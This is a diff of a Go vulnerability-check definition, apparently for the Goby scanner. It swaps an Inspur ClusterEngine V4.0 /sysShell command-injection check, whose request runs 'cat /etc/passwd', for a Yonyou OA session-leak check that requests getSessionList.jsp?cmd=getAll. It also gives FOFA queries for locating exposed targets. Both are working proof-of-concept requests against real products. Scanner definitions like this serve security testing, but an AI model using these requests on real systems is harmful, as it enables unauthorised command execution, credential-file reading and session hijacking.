@@ -6,15 +6,16 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞",
+  "Name": "用友OA cookie信息泄漏",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
-  "Author": "",
-  "FofaQuery": "title=\"TSCEV4.0\" || product=\"Inspur-ClusterEngine\" || \"ClusterEngine\"",
-  "GobyQuery": "title=\"TSCEV4.0\" || product=\"Inspur-ClusterEngine\" || \"ClusterEngine\"",
-  "Level": "3",
+  "PostTime": "2023-06-20",
+  "Author": "清晨",
+  "FofaQuery": " \"用友U8-OA\" || body=\"seeyonoa/common/js/popDialog.jsp\"",
+  "GobyQuery": " \"用友U8-OA\" || body=\"seeyonoa/common/js/popDialog.jsp\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -29,12 +30,19 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "POST",
-        "uri": "/sysShell",
-        "follow_redirect": true,
-        "header": {},
+        "method": "GET",
+        "uri": "/yyoa/ext/https/getSessionList.jsp?cmd=getAll",
+        "follow_redirect": false,
+        "header": {
+          "Upgrade-Insecure-Requests": "1",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+          "Accept-Encoding": "gzip, deflate",
+          "Accept-Language": "zh-CN,zh;q=0.9",
+          "Cookie": "JSESSIONID=CDE3690A81CE6C9A898721152BE2199E",
+          "Connection": "close"
+        },
         "data_type": "text",
-        "data": "op=doPlease&node=cu01&command=cat /etc/passwd"
+        "data": ""
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +59,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "root:",
+            "value": "<SessionList>",
             "bz": ""
           }
         ]
@@ -107,7 +115,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞",
+      "Name": "用友OA cookie信息泄漏",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +124,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "tide ClusterEngineV4 sysShell rce",
+      "Name": "yonyou oa Cookie information leakage",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -131,8 +139,7 @@ func init() {
     "Service": null,
     "System": null,
     "Hardware": null
-  },
-  "PostTime": "2023-06-20"
+  }
 }`
 
 	ExpManager.AddExploit(NewExploit(
